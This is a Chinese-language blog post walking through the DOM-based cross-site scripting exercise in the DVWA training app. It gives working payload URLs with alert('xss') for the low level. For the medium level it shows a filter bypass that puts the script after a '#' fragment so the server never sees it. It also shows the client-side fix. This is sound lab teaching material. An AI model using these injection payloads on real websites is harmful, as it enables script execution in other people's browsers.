---
layout: post
title: "DVWA XSS DOM"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_XSS
author: ""
tags: ['DVWA', 'XSS']
---



# DVWA XSS DOM
###### tags: `DVWA`


dom的xss 就是代碼插入 dom 裡面。



<br/>

如此一來能分析前台代碼更容易被破解。
<br/>
<br/>


# Low

完全沒保護 按下select 看 url 


```url=
http://www.dvwa.com/vulnerabilities/xss_d/?default=English
```

改成

```
http://www.dvwa.com/vulnerabilities/xss_d/?default=111111

```

發現 option 中的選項被改成了 111111

也就是說我們能直接改變dom 元素。


```
<script>alert('xss')</script>
```

這邊browser 自動 urlencode 也可以通過。
```
http://www.dvwa.com/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%27xss%27)%3C/script%3E
```
<br/><br/>




# Medium

後端有判斷了 get 請求的參數 default

code:
```php=
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?> 
```

過慮了字串:
只要有這個字串出現一次就跳轉成  header ("location: ?default=English");

```
大小寫 失敗
<Script>alert(1)</Script>


雙寫也失敗，因為他不是轉為空，而是判斷有沒有出現
<scr<script>ipt>alert(123)</scr<script>ipt>

```




分析一下代碼:
```javascript=
<select name="default">
   <script>
      if (document.location.href.indexOf("default=") >= 0) {
      	var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
        
          
        //關鍵
      	document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
      	document.write("<option value='' disabled='disabled'>-</option>");
      }
          
      document.write("<option value='English'>English</option>");
      document.write("<option value='French'>French</option>");
      document.write("<option value='Spanish'>Spanish</option>");
      document.write("<option value='German'>German</option>");
   </script>
   <option value="English">English</option>
   <option value="French">French</option>
   <option value="Spanish">Spanish</option>
   <option value="German">German</option>
</select>
```


看起來很屌，但是有一個招

### #號
* 作為一個html網頁錨的定位功能，#號後面的資料是不會進到後台的。


小坑:

* 如果你url 已經有default=English  此時加入#1111111會失敗，

* 此時按enter 是在定位html 錨

原因是#號後面輸入東西 enter 是在定位網頁的錨點，而且就算後端的判斷看到有English 就直接break了



```url=
www.dvwa.com/vulnerabilities/xss_d/?default=English#1111111
```


* 我們必須發請求到後台，後台發現空資料轉預設English，然後前台重新幫我們產生頁面，才能成功

* 後台判斷發現為跳轉成 header ("location: ?default=English");
而此時前端頁面的腳本才執行 English#1111111 加入dom元素


```
www.dvwa.com/vulnerabilities/xss_d/?default=#111111111
```


了解後，連閉合都不用:
```
www.dvwa.com/vulnerabilities/xss_d/?default=#<script>alert('xss')</script>
```

<br/><br/>



# Impossible


後台:
不需要做任何事情，保護在客戶端處理
dom xss 既然後端無法完全處理，那就只能在前台防禦
```php=
<?php

# Don't need to do anything, protction handled on the client side

?> 
```




decodeURI(lang) 變成了 (lang)，所有輸入最後都會被url encode 所以防禦了

```javascript=
<select name="default">
   <script>
      if (document.location.href.indexOf("default=") >= 0) {
      	var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
      	document.write("<option value='" + lang + "'>" + (lang) + "</option>");
      	document.write("<option value='' disabled='disabled'>----</option>");
      }
          
      document.write("<option value='English'>English</option>");
      document.write("<option value='French'>French</option>");
      document.write("<option value='Spanish'>Spanish</option>");
      document.write("<option value='German'>German</option>");
   </script>
   <option value="English">English</option>
   <option value="French">French</option>
   <option value="Spanish">Spanish</option>
   <option value="German">German</option>
</select>

```

